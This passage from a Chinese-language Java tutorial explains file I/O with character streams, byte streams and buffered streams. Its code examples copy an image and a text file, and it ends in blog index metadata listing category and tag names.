File(&quot;hello_copy.txt&quot;); // 创建字符输入输出流 fileReader = new FileReader(file); fileWriter = new FileWriter(file1); // 读取hello.txt char[] cbuffer = new char[5]; int len; while ((len = fileReader.read(cbuffer)) != -1) &#123; fileWriter.write(cbuffer, 0, len); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; finally &#123; // 关闭输入输出流 try&#123; if (fileWriter != null) fileWriter.close(); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; try &#123; if (fileReader != null) fileReader.close(); &#125;catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; &#125;&#125; InputStream and OutputStreamInputStream-说明java.io.InputStream 抽象类是表示字节输入流的所有类的超类，可以读取字节信息到内存中。它定义了字节输入流的基本共性功能方法 1234public int read()：从输入流读取一个字节。返回读取的字节值。虽然读取了一个字节，但是会自动提升为 int 类型。如果已经到达流末尾，没有数据可读，则返回-1public int read(byte[] b)：从输入流中读取一些字节数，并将它们存储到字节数组 b 中 。每次最多读取 b.length 个字节。返回实际读取的字节个数。如果已经到达流末尾，没有数据可读，则返回-1public int read(byte[] b,int off,int len)：从输入流中读取一些字节数，并将它们存储到字节数组 b 中，从 b[off]开始存储，每次最多读取 len 个字节 。返回实际读取的字节个数。如果已经到达流末尾，没有数据可读，则返回-1public void close()：关闭此输入流并释放与此流相关联的任何系统资源 OutputStream-说明java.io.OutputStream 抽象类是表示字节输出流的所有类的超类，将指定的字节信息写出到目的地。它定义了字节输出流的基本共性功能方法 12345public void write(int b)：将指定的字节输出流。虽然参数为 int 类型四个字节，但是只会保留一个字节的信息写出public void write(byte[] b)：将 b.length 字节从指定的字节数组写入此输出流public void write(byte[] b, int off, int len)：从指定的字节数组写入 len 字节，从偏移量 off 开始输出到此输出流public void flush()：刷新此输出流并强制任何缓冲的输出字节被写出public void close()：关闭此输出流并释放与此流相关联的任何系统资源。说明：close()方法，当完成流的操作时，必须调用此方法，释放系统资源 FileInputStream and FileOutputStream字节流通常是用来处理非文本文件的。若涉及到文本文件的复制操作，也可以使用字节流。但是若是传输途中查看可能会出现乱码情况。 FileInputStream-说明java.io.FileInputStream 类是文件输入流，从文件中读取字节 12FileInputStream(File file)：通过打开与实际文件的连接来创建一个 FileInputStream ，该文件由文件系统中的 File 对象 file 命名. FileInputStream(String name)：通过打开与实际文件的连接来创建一个 FileInputStream ，该文件由文件系统中的路径名 name 命名。 FileOutputStream-说明java.io.FileOutputStream 类是文件输出流，用于将数据写出到文件 123public FileOutputStream(File file)：创建文件输出流，写出由指定的 File对象表示的文件public FileOutputStream(String name)：创建文件输出流，指定的名称为写出文件public FileOutputStream(File file, boolean append)：创建文件输出流，指明是否在现有文件末尾追加内容 案例-复制一张图片1234567891011121314151617181920212223242526272829303132333435363738394041public class Main &#123; public static void main(String[] args) throws IOException &#123; FileInputStream fileInputStream = null; FileOutputStream fileOutputStream = null; try &#123; // 创建相关的File类对象 File file = new File(&quot;test.jpg&quot;); File file1 = new File(&quot;test_copy.jpg&quot;); // 创建相关的字节流 fileInputStream = new FileInputStream(file); fileOutputStream = new FileOutputStream(file1); // 数据的读入和写出 byte[] buffer = new byte[1024]; int len; while ((len = fileInputStream.read(buffer)) != -1) &#123; fileOutputStream.write(buffer, 0, len); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; finally &#123; // 关闭资源 try &#123; if (fileInputStream != null) &#123; fileInputStream.close(); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; try &#123; if (fileOutputStream != null) &#123; fileOutputStream.close(); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 处理流缓冲流 缓冲流的作用为：提升文件读写效率 缓冲流的原理为：在创建流对象时，内部会创建一个缓冲区数组（缺省使用 8192个字节(8Kb)的缓冲区），通过缓冲区读写，减少系统 IO 次数，从而提高读写的效率 整体使用其实与文件流无太大区别，只是在文件传输流外包裹了一个缓冲流，数据读取写入时也是用缓冲流进行操作。关闭流资源时先关闭外层再关闭内存，但是外层关闭后会自动关闭内层流，所以可以省略关闭内存流的操作。 BufferedInputStream and BufferedOutputStream字节缓冲流 12public BufferedInputStream(InputStream in)：创建一个新的字节型的缓冲输入流public BufferedOutputStream(OutputStream out)：创建一个新的字节型的缓冲输出流 1234567891011121314151617181920212223242526272829303132333435363738394041424344public class Main &#123; public static void main(String[] args) &#123; BufferedInputStream bufferedInputStream = null; BufferedOutputStream bufferedOutputStream = null; try &#123; File file = new File(&quot;test.jpg&quot;); File file1 = new File(&quot;test_copy.jpg&quot;); // 字节流 FileInputStream fileInputStream = new FileInputStream(file); FileOutputStream fileOutputStream = new FileOutputStream(file1); // 缓冲流 bufferedInputStream = new BufferedInputStream(fileInputStream); bufferedOutputStream = new BufferedOutputStream(fileOutputStream); // 数据读入和写出 byte[] buffer = new byte[1024]; int len; while ((len = bufferedInputStream.read(buffer)) != -1) &#123; bufferedOutputStream.write(buffer, 0, len); &#125; &#125; catch (IOException e) &#123; throw new RuntimeException(e); &#125; finally &#123; // 关闭资源，先关外层，再关内层 try &#123; if (bufferedOutputStream != null) &#123; bufferedOutputStream.close(); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; try &#123; if (bufferedInputStream != null) &#123; bufferedInputStream.close(); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; BufferedReader and BufferedWriter字符缓冲流 12BufferedReader：public String readLine()：读一行文字BufferedWriter：public void newLine()：写一行行分隔符,由系统属性定义符号 readLine方法是缓冲流特有的方法，其按行读取，且不读取换行 \\n，当读取完后会返回 NULL 12345678910111213141516171819202122232425262728293031public class Main &#123; public static void main(String[] args) &#123; FileReader fileReader = null; try &#123; File file = new File(&quot;hello.txt&quot;); // 字符流 fileReader = new FileReader(file); // 缓冲流 BufferedReader bufferedReader = new BufferedReader(fileReader); char[] cbuffer = new char[5]; int len; while ((len = bufferedReader.read(cbuffer)) != -1) &#123; System.out.println(new String(cbuffer, 0, len)); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; finally &#123; try &#123; if (fileReader != null) &#123; fileReader.close(); &#125; &#125;catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 案例-读取大型txt文件123456789101112131415161718192021222324252627282930313233343536373839404142public class Main &#123; public static void main(String[] args) &#123; BufferedReader bufferedReader = null; BufferedWriter bufferedWriter = null; try &#123; File file = new File(&quot;hello.txt&quot;); File file1 = new File(&quot;hello_copy.txt&quot;); // 字符流 FileReader fileReader = new FileReader(file); FileWriter fileWriter = new FileWriter(file1); // 缓冲流 bufferedReader = new BufferedReader(fileReader); bufferedWriter = new BufferedWriter(fileWriter); // 读取数据并写入数据，使用readline一行行读取，一行行写入 String data; while ((data = bufferedReader.readLine()) != null) &#123; bufferedWriter.write(data + &quot;\\n&quot;); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; finally &#123; // 异常关闭 try &#123; if (bufferedReader != null) &#123; bufferedReader.close(); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; try &#123; if (bufferedWriter != null) &#123; bufferedWriter.close(); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125;","categories":[{"name":"代码学习","slug":"代码学习","permalink":"http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"}]}],"categories":[{"name":"permission maintenance","slug":"permission-maintenance","permalink":"http://example.com/categories/permission-maintenance/"},{"name":"Emergency response","slug":"Emergency-response","permalink":"http://example.com/categories/Emergency-response/"},{"name":"Code Audit","slug":"Code-Audit","permalink":"http://example.com/categories/Code-Audit/"},{"name":"Active directory pentesting","slug":"Active-directory-pentesting","permalink":"http://example.com/categories/Active-directory-pentesting/"},{"name":"实用技巧","slug":"实用技巧","permalink":"http://example.com/categories/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"name":"代码学习","slug":"代码学习","permalink":"http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"Mysql","slug":"Mysql","permalink":"http://example.com/tags/Mysql/"},{"name":"Redis","slug":"Redis","permalink":"http://example.com/tags/Redis/"},{"name":"Code Audit","slug":"Code-Audit","permalink":"http://example.com/tags/Code-Audit/"},{"name":"SQL Injection","slug":"SQL-Injection","permalink":"http://example.com/tags/SQL-Injection/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"DCSync","slug":"DCSync","permalink":"http://example.com/tags/DCSync/"},{"name":"OU","slug":"OU","permalink":"http://example.com/tags/OU/"},{"name":"user group","slug":"user-group","permalink":"http://example.com/tags/user-group/"},{"name":"Active directory","slug":"Active-directory","permalink":"http://example.com/tags/Active-directory/"},{"name":"LDAP","slug":"LDAP","permalink":"http://example.com/tags/LDAP/"},{"name":"Domain","slug":"Domain","permalink":"http://example.com/tags/Domain/"},{"name":"Users","slug":"Users","permalink":"http://example.com/tags/Users/"},{"name":"电子取证","slug":"电子取证","permalink":"http://example.com/tags/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"},{"name":"RID","slug":"RID","permalink":"http://example.com/tags/RID/"},{"name":"SID","slug":"SID","permalink":"http://example.com/tags/SID/"},{"name":"Oracle","slug":"Oracle","permalink":"http://example.com/tags/Oracle/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"}]}